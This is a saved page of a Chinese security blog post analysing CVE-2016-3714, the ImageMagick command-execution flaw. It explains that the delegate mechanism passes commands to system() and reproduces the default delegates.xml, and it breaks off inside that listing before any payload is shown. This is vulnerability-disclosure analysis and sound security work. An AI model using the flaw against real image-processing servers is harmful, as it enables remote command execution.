
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
<link href="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/favicon.ico" rel="shortcut icon"/>
<link href="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
<link href="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
<title>CVE-2016-3714 - ImageMagick 命令执行分析 | 离别歌</title>
<link href="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/font-awesome.min.css" rel="stylesheet"/>
<link href="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/styles.css" rel="stylesheet"/>
<link href="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/style.css" rel="stylesheet"/>
<link href="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
<link href="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
<script src="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/jquery.min.js"></script>
<link href="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/code.css" rel="stylesheet"/>
<link href="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/button.css" rel="stylesheet"/>
<link href="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/pagination.css" rel="stylesheet"/>
<link href="./CVE-2016-3714 - ImageMagick 命令执行分析  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
</link></meta></head>
<body>
<div id="header-post">
<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
<span id="menu" style="visibility: visible">
<span id="nav">
<ul>
<li><a href="/">主页</a></li>
<li><a href="javascript:history.back(-1)">返回</a></li>
</ul>
</span>
<br/>
<span id="actions">
<ul>
<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
</ul>
<span class="info" id="i-top" style="display:none;">Back to top</span>
<span class="info" id="i-share" style="display:none;">Share post</span>
</span>
<br/>
<div id="share" style="display: none">
<ul>
<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html&amp;text=CVE-2016-3714%20-%20ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html&amp;title=CVE-2016-3714%20-%20ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html&amp;is_video=false&amp;description=CVE-2016-3714%20-%20ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
<li><a class="icon" href="mailto:?subject=CVE-2016-3714%20-%20ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html&amp;title=CVE-2016-3714%20-%20ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html&amp;title=CVE-2016-3714%20-%20ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html&amp;title=CVE-2016-3714%20-%20ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html&amp;title=CVE-2016-3714%20-%20ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html&amp;name=CVE-2016-3714%20-%20ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
</ul>
</div>
</span>
</div>
<div class="content index width mx-auto px2 my4">
<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
<header>
<h1 class="posttitle" itemprop="name headline">CVE-2016-3714 - ImageMagick 命令执行分析</h1>
<div class="meta">
<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
<span itemprop="name">Phithon</span>
</span>
<div class="postdate">
<time datetime="2016年5月8日 01:33" itemprop="datePublished">
                    2016 五月 08 01:33
                </time>
</div>
<div class="article-tag">
            阅读：2496
            </div>
<div class="article-tag">
<i class="fa fa-bookmark"></i>
<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
</div>
<div class="article-tag">
<i class="fa fa-tag"></i>
<a class="tag-link" href="/tag/ImageMagick">ImageMagick</a>,
                
                <a class="tag-link" href="/tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">命令执行漏洞</a>
</div>
</div>
</header>
<div class="content" itemprop="articleBody">
<p>ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但近来有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。</p>
<p>国外的安全人员为此新建了一个网站： <a href="https://imagetragick.com/"><a href="https://imagetragick.com/">https://imagetragick.com/</a></a> ，不得不说，有些外国人蛮会玩的。</p>
<p>相对于之前的数个拥有『主页』的漏洞，这个洞确实不一般，确实是一个可以被利用的好洞，乌云主站上也爆出了数个被该漏洞影响的大厂商。我们先来分析一下它出现的原因。</p>
<h2 id="_1"><a class="toclink" href="#_1">原理分析</a></h2>
<p>与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。</p>
<p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的（ <a href="https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L347"><a href="https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L347">https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L347</a></a> ）</p>
<p>我们在ImageMagick的默认配置文件里可以看到所有的委托： /etc/ImageMagick/delegates.xml</p>
<div class="codehilite"><pre><span></span><span class="o">&lt;?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">"1.0"</span> <span class="n">encoding</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="o">?&gt;</span>
<span class="o">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">delegatemap</span> <span class="p">[</span>
<span class="o">&lt;!</span><span class="n">ELEMENT</span> <span class="n">delegatemap</span> <span class="p">(</span><span class="n">delegate</span><span class="p">)</span><span class="o">+&gt;</span>
<span class="o">&lt;!</span><span class="n">ELEMENT</span> <span class="n">delegate</span> <span class="p">(</span><span class="cp">#PCDATA</span><span class="p">)</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">ATTLIST</span> <span class="n">delegate</span> <span class="n">decode</span> <span class="n">CDATA</span> <span class="cp">#IMPLIED</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">ATTLIST</span> <span class="n">delegate</span> <span class="n">encode</span> <span class="n">CDATA</span> <span class="cp">#IMPLIED</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">ATTLIST</span> <span class="n">delegate</span> <span class="n">mode</span> <span class="n">CDATA</span> <span class="cp">#IMPLIED</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">ATTLIST</span> <span class="n">delegate</span> <span class="n">spawn</span> <span class="n">CDATA</span> <span class="cp">#IMPLIED</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">ATTLIST</span> <span class="n">delegate</span> <span class="n">stealth</span> <span class="n">CDATA</span> <span class="cp">#IMPLIED</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">ATTLIST</span> <span class="n">delegate</span> <span class="kr">thread</span><span class="o">-</span><span class="n">support</span> <span class="n">CDATA</span> <span class="cp">#IMPLIED</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">ATTLIST</span> <span class="n">delegate</span> <span class="n">command</span> <span class="n">CDATA</span> <span class="cp">#REQUIRED</span><span class="o">&gt;</span>
<span class="p">]</span><span class="o">&gt;</span>
<span class="o">&lt;!--</span>
<span class="n">Delegate</span> <span class="n">command</span> <span class="n">file</span><span class="p">.</span>

<span class="n">Commands</span> <span class="n">which</span> <span class="n">specify</span>

<span class="n">decode</span><span class="o">=</span><span class="s">"in_format"</span> <span class="n">encode</span><span class="o">=</span><span class="s">"out_format"</span>

<span class="n">specify</span> <span class="n">the</span> <span class="n">rules</span> <span class="k">for</span> <span class="n">converting</span> <span class="n">from</span> <span class="n">in_format</span> <span class="n">to</span> <span class="n">out_format</span> <span class="n">These</span>
<span class="n">rules</span> <span class="n">may</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">translate</span> <span class="n">directly</span> <span class="n">between</span> <span class="n">formats</span><span class="p">.</span>

<span class="n">Commands</span> <span class="n">which</span> <span class="n">specify</span> <span class="n">only</span>

<span class="n">decode</span><span class="o">=</span><span class="s">"in_format"</span>

<span class="n">specify</span> <span class="n">the</span> <span class="n">rules</span> <span class="k">for</span> <span class="n">converting</span> <span class="n">from</span> <span class="n">in_format</span> <span class="n">to</span> <span class="n">some</span> <span class="n">format</span> <span class="n">that</span>
<span class="n">ImageMagick</span> <span class="n">will</span> <span class="n">automatically</span> <span class="n">recognize</span><span class="p">.</span> <span class="n">These</span> <span class="n">rules</span> <span class="n">are</span> <span class="n">used</span> <span class="n">to</span>
<span class="n">decode</span> <span class="n">formats</span><span class="p">.</span>

<span class="n">Commands</span> <span class="n">which</span> <span class="n">specify</span> <span class="n">only</span>

<span class="n">encode</span><span class="o">=</span><span class="s">"out_format"</span>

<span class="n">specify</span> <span class="n">the</span> <span class="n">rules</span> <span class="k">for</span> <span class="n">an</span> <span class="s">"encoder"</span> <span class="n">which</span> <span class="n">may</span> <span class="n">accept</span> <span class="n">any</span> <span class="n">input</span> <span class="n">format</span><span class="p">.</span>

<span class="n">For</span> <span class="n">delegates</span> <span class="n">other</span> <span class="n">than</span> <span class="nl">ps</span><span class="p">:</span><span class="o">*</span><span class="p">,</span> <span class="nl">pcl</span><span class="p">:</span><span class="o">*</span><span class="p">,</span> <span class="n">and</span> <span class="nl">mpeg</span><span class="p">:</span><span class="o">*</span> <span class="n">the</span> <span class="n">substitution</span> <span class="n">rules</span> <span class="n">are</span>
<span class="n">as</span> <span class="nl">follows</span><span class="p">:</span>

<span class="nf">%i</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">filename</span>
<span class="nf">%o</span>  <span class="n">output</span> <span class="n">image</span> <span class="n">filename</span>
<span class="nf">%u</span>  <span class="n">unique</span> <span class="n">temporary</span> <span class="n">filename</span>
<span class="o">%</span><span class="n">Z</span>  <span class="n">unique</span> <span class="n">temporary</span> <span class="n">filename</span>
<span class="o">%</span><span class="err">#</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">signature</span>
<span class="nf">%b</span>  <span class="n">image</span> <span class="n">file</span> <span class="n">size</span>
<span class="nf">%c</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">comment</span>
<span class="nf">%g</span>  <span class="n">image</span> <span class="n">geometry</span>
<span class="nf">%h</span>  <span class="n">image</span> <span class="n">rows</span> <span class="p">(</span><span class="n">height</span><span class="p">)</span>
<span class="nf">%k</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">number</span> <span class="n">colors</span>
<span class="nf">%l</span>  <span class="n">image</span> <span class="n">label</span>
<span class="nf">%m</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">format</span>
<span class="nf">%p</span>  <span class="n">page</span> <span class="n">number</span>
<span class="nf">%q</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">depth</span>
<span class="nf">%s</span>  <span class="n">scene</span> <span class="n">number</span>
<span class="nf">%w</span>  <span class="n">image</span> <span class="n">columns</span> <span class="p">(</span><span class="n">width</span><span class="p">)</span>
<span class="nf">%x</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">x</span> <span class="n">resolution</span>
<span class="nf">%y</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">y</span> <span class="n">resolution</span>

<span class="n">Set</span> <span class="n">option</span> <span class="nl">delegate</span><span class="p">:</span><span class="n">bimodal</span><span class="o">=</span><span class="nb">true</span> <span class="n">to</span> <span class="n">process</span> <span class="n">bimodal</span> <span class="n">delegates</span> <span class="n">otherwise</span> <span class="n">they</span>
<span class="n">are</span> <span class="n">ignored</span><span class="p">.</span>

<span class="n">If</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">the</span> <span class="n">delegate</span> <span class="n">is</span> <span class="n">not</span> <span class="n">listed</span> <span class="n">in</span> <span class="n">user</span> <span class="n">requested</span>
<span class="s">"-list delegate"</span> <span class="n">listings</span><span class="p">.</span> <span class="n">These</span> <span class="n">are</span> <span class="n">typically</span> <span class="n">special</span> <span class="n">internal</span> <span class="n">delegates</span><span class="p">.</span>

<span class="n">If</span> <span class="n">spawn</span><span class="o">=</span><span class="s">"True"</span> <span class="n">ImageMagick</span> <span class="n">will</span> <span class="n">not</span> <span class="n">way</span> <span class="k">for</span> <span class="n">the</span> <span class="n">delegate</span> <span class="n">to</span> <span class="n">finish</span><span class="p">,</span>
<span class="n">nor</span> <span class="n">will</span> <span class="n">it</span> <span class="n">read</span> <span class="n">any</span> <span class="n">output</span> <span class="n">image</span><span class="p">.</span>  <span class="n">It</span> <span class="n">will</span> <span class="n">only</span> <span class="n">wait</span> <span class="k">for</span> <span class="n">either</span> <span class="n">the</span> <span class="n">input</span>
<span class="n">file</span> <span class="n">to</span> <span class="n">be</span> <span class="n">removed</span> <span class="p">(</span><span class="n">See</span> <span class="s">"ephemeral:"</span> <span class="n">coder</span><span class="p">)</span> <span class="n">indicating</span> <span class="n">that</span> <span class="n">the</span> <span class="n">input</span> <span class="n">file</span>
<span class="n">has</span> <span class="n">been</span> <span class="n">read</span><span class="p">,</span> <span class="n">or</span> <span class="n">a</span> <span class="n">maximum</span> <span class="n">time</span> <span class="n">limit</span> <span class="n">of</span> <span class="mi">2</span> <span class="n">seconds</span><span class="p">.</span>
<span class="o">--&gt;</span>
<span class="o">&lt;</span><span class="n">delegatemap</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"autotrace"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;convert&amp;quot; &amp;quot;%i&amp;quot; &amp;quot;pnm:%u&amp;quot;</span><span class="se">\n</span><span class="s">&amp;quot;autotrace&amp;quot; -input-format pnm -output-format svg -output-file &amp;quot;%o&amp;quot; &amp;quot;%u&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"blender"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;blender&amp;quot; -b &amp;quot;%i&amp;quot; -F PNG -o &amp;quot;%o&amp;quot;&amp;quot;</span><span class="se">\n</span><span class="s">&amp;quot;convert&amp;quot; -concatenate &amp;quot;%o*.png&amp;quot; &amp;quot;%o&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"browse"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">spawn</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;xdg-open&amp;quot; http://www.imagemagick.org/; rm &amp;quot;%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"cdr"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;uniconvertor&amp;quot; &amp;quot;%i&amp;quot; &amp;quot;%o.svg&amp;quot;; mv &amp;quot;%o.svg&amp;quot; &amp;quot;%o&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"cgm"</span> <span class="kr">thread</span><span class="o">-</span><span class="n">support</span><span class="o">=</span><span class="s">"False"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;ralcgm&amp;quot; -d ps -oC &amp;lt; &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot; 2&amp;gt; &amp;quot;%Z&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"dvi"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;dvips&amp;quot; -q -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"dng:decode"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;ufraw-batch&amp;quot; --silent --create-id=also --out-type=png --out-depth=16 &amp;quot;--output=%u.png&amp;quot; &amp;quot;%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"dot"</span> <span class="n">command</span><span class="o">=</span><span class="err">'</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">dot</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span> <span class="o">-</span><span class="n">Tsvg</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="nf">%i</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span> <span class="o">-</span><span class="n">o</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="nf">%o</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="err">'</span> <span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"edit"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;/etc/alternatives/x-terminal-emulator&amp;quot; -title &amp;quot;Edit Image Comment&amp;quot; -e vi &amp;quot;%o&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"eps"</span> <span class="n">encode</span><span class="o">=</span><span class="s">"pdf"</span> <span class="n">mode</span><span class="o">=</span><span class="s">"bi"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 &amp;quot;-sDEVICE=pdfwrite&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"eps"</span> <span class="n">encode</span><span class="o">=</span><span class="s">"ps"</span> <span class="n">mode</span><span class="o">=</span><span class="s">"bi"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=nodevice&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"fig"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;fig2dev&amp;quot; -L ps &amp;quot;%i&amp;quot; &amp;quot;%o&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"plt"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;echo&amp;quot; &amp;quot;set size 1.25,0.62; set terminal postscript portrait color solid; set output </span><span class="se">\'</span><span class="s">%o</span><span class="se">\'</span><span class="s">; load </span><span class="se">\'</span><span class="s">%i</span><span class="se">\'</span><span class="s">&amp;quot; &amp;gt; &amp;quot;%u&amp;quot;;&amp;quot;gnuplot&amp;quot; &amp;quot;%u&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"hpg"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;hp2xx&amp;quot; -q -m eps -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%i&amp;quot;;     mv -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%o&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"hpgl"</span> <span class="n">command</span><span class="o">=</span><span class="s">"if [ -e hp2xx -o -e /usr/bin/hp2xx ]; then     hp2xx -q -m eps -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%i&amp;quot;;     mv -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%o&amp;quot;;   else     echo &amp;quot;You need to install hp2xx to use HPGL files with ImageMagick.&amp;quot;;     exit 1;   fi"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"htm"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;html2ps&amp;quot; -U -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"html"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;html2ps&amp;quot; -U -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"https"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;curl&amp;quot; -s -k -o &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"ilbm"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;ilbmtoppm&amp;quot; &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"man"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;groff&amp;quot; -man -Tps &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"mpeg:decode"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;ffmpeg&amp;quot; -v -1 -i &amp;quot;%i&amp;quot; -vframes %S -vcodec pam -an -f rawvideo -y &amp;quot;%u.pam&amp;quot; 2&amp;gt; &amp;quot;%Z&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">encode</span><span class="o">=</span><span class="s">"mpeg:encode"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;ffmpeg&amp;quot; -v -1 -mbd rd -trellis 2 -cmp 2 -subcmp 2 -g 300 -i &amp;quot;%M%%d.jpg&amp;quot; &amp;quot;%u.%m&amp;quot; 2&amp;gt; &amp;quot;%Z&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"sid"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;mrsidgeodecode&amp;quot; -if sid -i &amp;quot;%i&amp;quot; -of tif -o &amp;quot;%o&amp;quot; &amp;gt; &amp;quot;%u&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"pcl:color"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;pcl6&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=ppmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"pcl:cmyk"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;pcl6&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pamcmyk32&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">"pcl:mono"</span> <span class="n">stealth</span><span class="o">=</span><span class="s">"True"</span> <span class="n">command</span><span class="o">=</span><span class="s">"&amp;quot;pcl6&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pbmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;"</span><span class="o">/&gt;</span>
